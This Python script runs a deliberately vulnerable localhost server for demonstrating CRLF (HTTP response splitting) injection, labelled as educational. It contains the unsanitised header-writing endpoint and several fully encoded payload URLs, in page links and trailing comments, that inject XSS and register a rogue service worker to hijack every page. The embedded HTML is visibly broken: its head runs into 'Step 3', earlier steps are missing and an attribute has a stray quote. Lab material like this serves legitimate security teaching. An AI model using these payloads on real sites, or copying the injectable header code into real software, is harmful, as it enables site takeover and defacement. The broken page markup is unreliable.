#!/usr/bin/env python3
"""
CRLF Injection + Service Worker Test Server
WARNING: This is intentionally vulnerable for educational purposes only!
DO NOT use in production or expose to the internet.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
import webbrowser
import time

class VulnerableHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)
        
        print(f"\n[REQUEST] {self.path}")
        
        if parsed_url.path == '/':
            self.send_main_page()
            
        elif parsed_url.path == '/profile':
            name = query_params.get('name', ['Guest'])[0]
            self.send_vulnerable_response(name)
            
        elif parsed_url.path == '/test':
            self.send_test_page()
            
        elif parsed_url.path == '/collect':
            self.handle_attack_data()
            
        else:
            self.send_404()
    
    def send_main_page(self):
        """Send the main page with attack links"""
        html = """
<!DOCTYPE html>
<html>
<head>
        
        <div class="step">
            <h3>Step 3: XSS via CRLF</h3>
            <p>Create fake HTML response with JavaScript:</p>
            <a href="/profile?name=x%0D%0AContent-Type:text/html%0D%0AContent-Length:35%0D%0A%0D%0A<script>alert('CRLF XSS Works!')</script>" target="_blank">CRLF XSS Attack</a>
        </div>
        
        <div class="attack">
            <h3>Step 4: SERVICE WORKER TAKEOVER</h3>
            <p>The Service Worker will intercept ALL requests and show "HACKED BY SERVICE WORKER" on every page.</p>
            
            <h4>Method 1: Fixed Content-Length Attack</h4>
            <a href="/profile?name=x%0D%0AContent-Type:text/html%0D%0AContent-Length:362%0D%0A%0D%0A%3Cscript%3Enavigator.serviceWorker.register(%27/profile?name=sw%250D%250AService-Worker-Allowed:/%250D%250AContent-Type:text/javascript%250D%250AContent-Length:120%250D%250A%250D%250Aself.addEventListener(%2522fetch%2522,e=%3Ee.respondWith(new%20Response(%2522%3Ch1%3EHACKED!%3C/h1%3E%2522,{headers:{%2522Content-Type%2522:%2522text/html%2522}})))%27,{scope:%27/%27}).then(()=%3Ealert(%27Service%20Worker%20Installed!%27))%3C/script%3E" 
               onclick="return confirm('This will install a malicious Service Worker that takes over the site. Continue?')" ">
               EXECUTE SERVICE WORKER ATTACK (Fixed)
            </a>
        </div>
        
        <div class="step">
            <h3>Step 5: Test Takeover</h3>
            <p>After installing the Service Worker, visit any page to see the takeover:</p>
            <a href="/test" target="_blank">Test Page (Will be intercepted)</a>
            <a href="/" target="_blank">Main Page (Will be intercepted)</a>
        </div>
        
    
</body>
</html>
        """
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def send_vulnerable_response(self, name):
        """The vulnerable endpoint that allows CRLF injection"""
        print(f"[VULNERABLE] Processing name parameter: {repr(name)}")
        
        response_body = f"<html><body><h1>Hello {name}!</h1><p>Profile page for {name}</p></body></html>"
        
        self.wfile.write(b'HTTP/1.1 200 OK\r\n')
        
        vulnerable_header = f"X-User-Name: {name}\r\n"
        self.wfile.write(vulnerable_header.encode())
        
        self.wfile.write(b'Content-Type: text/html\r\n')
        self.wfile.write(f'Content-Length: {len(response_body)}\r\n'.encode())
        self.wfile.write(b'\r\n')
        
        self.wfile.write(response_body.encode())
        print(f"[RESPONSE] Sent vulnerable response with injected name: {name[:50]}...")
    
    def send_test_page(self):
        """A normal page to test Service Worker interception"""
        html = """
<!DOCTYPE html>
<html>
<head>
    <title>Test Page</title>
    <style>body{font-family:Arial;margin:40px;background:#f5f5f5;}</style>
</head>
<body>
    <h1>Normal Test Page</h1>
    <p>If you see this content, the Service Worker is NOT active.</p>
    <p>If you see "HACKED BY SERVICE WORKER", the attack worked!</p>
    <a href="/">Back to Main Page</a>
    
    <script>
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.getRegistrations().then(registrations => {
                console.log('Service Worker registrations:', registrations);
            });
        }
    </script>
</body>
</html>
        """
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def handle_attack_data(self):
        """Simulate attacker's data collection endpoint"""
        print("[ATTACK] Simulated data collection endpoint hit")
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b"Attack data received")
    
    def send_404(self):
        self.send_response(404)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<h1>404 Not Found</h1>")
    
    def log_message(self, format, *args):
        """Override to customize logging"""
        print(f"[SERVER] {format % args}")

def start_server():
    """Start the vulnerable test server"""
    server_address = ('localhost', 8080)
    httpd = HTTPServer(server_address, VulnerableHandler)
    
    print("🚨 VULNERABLE TEST SERVER STARTING 🚨")
    print("=" * 50)
    print("⚠️  WARNING: This server is intentionally vulnerable!")
    print("⚠️  For educational purposes only!")
    print("⚠️  Never expose to the internet!")
    print("=" * 50)
    print(f"Server running at: http://localhost:8080")
    print("Press Ctrl+C to stop")
    print()
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[SERVER] Shutting down...")
        httpd.shutdown()

if __name__ == '__main__':
    start_server()







# http://localhost:8080/profile?name=x%0D%0AContent-Type%3Atext%2Fhtml%0D%0AContent-Length%3A377%0D%0A%0D%0A%3Cscript%3Enavigator.serviceWorker.register%28%27%2Fprofile%3Fname%3Dsw%250D%250AService-Worker-Allowed%253A%252F%250D%250AContent-Type%253Atext%252Fjavascript%250D%250AContent-Length%253A97%250D%250A%250D%250Aself.addEventListener%2528%2522activate%2522%252C%2520%2528%2529%2520%253D%253E%2520console.log%2528%2522ServiceWorker%2520activated%252C%2520no%2520interception%2522%2529%2529%253B%27%2C%20%7Bscope%3A%27%2F%27%7D%29.then%28%28%29%20%3D%3E%20alert%28%27Service%20Worker%20Installed%21%27%29%29%3C%2Fscript%3E


# http://localhost:8080/profile?name=x%0D%0AContent-Type%3Atext%2Fhtml%0D%0AContent-Length%3A377%0D%0A%0D%0A%3Cscript%3Enavigator.serviceWorker.register%28%27%2Fprofile%3Fname%3Dsw%250D%250AService-Worker-Allowed%253A%252F%250D%250AContent-Type%253Atext%252Fjavascript%250D%250AContent-Length%253A97%250D%250A%250D%250Aself.addEventListener%2528%2522activate%2522%252C%2520%2528%2529%2520%253D%253E%2520console.log%2528%2522ServiceWorker%2520activated%252C%2520no%2520interception%2522%2529%2529%253B%27%2C%20%7Bscope%3A%27%2F%27%7D%29.then%28%28%29%20%3D%3E%20alert%28%27Service%20Worker%20Installed%21%27%29%29%3C%2Fscript%3E

# http://localhost:8080/profile?name=x%0D%0AContent-Type:text/html%0D%0AContent-Length:367%0D%0A%0D%0A%3Cscript%3Enavigator.serviceWorker.register(%27/profile?name=sw%250D%250AService-Worker-Allowed:/%250D%250AContent-Type:text/javascript%250D%250AContent-Length:165%250D%250A%250D%250Aself.addEventListener(%2522fetch%2522,function(event){event.respondWith(new%2520Response(%2522Fake%2520response%2522,{status:200,statusText:%2522OK%2522,headers:{%2522Content-Type%2522:%2522text/html%2522}}))})%27,{scope:%27/%27})%3C/script%3E


# http://localhost:8080/profile?name=x%0D%0AContent-Type:text/html%0D%0AContent-Length:362%0D%0A%0D%0A%3Cscript%3Enavigator.serviceWorker.register(%27/profile?name=sw%250D%250AService-Worker-Allowed:/%250D%250AContent-Type:text/javascript%250D%250AContent-Length:120%250D%250A%250D%250Aself.addEventListener(%2522fetch%2522,e=%3Ee.respondWith(new%20Response(%2522%3Ch1%3EHACKED!%3C/h1%3E%2522,{headers:{%2522Content-Type%2522:%2522text/html%2522}})))%27,{scope:%27/%27}).then(()=%3Ealert(%27Service%20Worker%20Installed!%27))%3C/script%3E


# navigator.serviceWorker.getRegistrations().then(function(registrations) {
#     registrations.forEach(function(registration) {
#         registration.unregister().then(function() {
#             console.log('Service Worker unregistered for scope: ' + registration.scope);
#         });
#     });
# });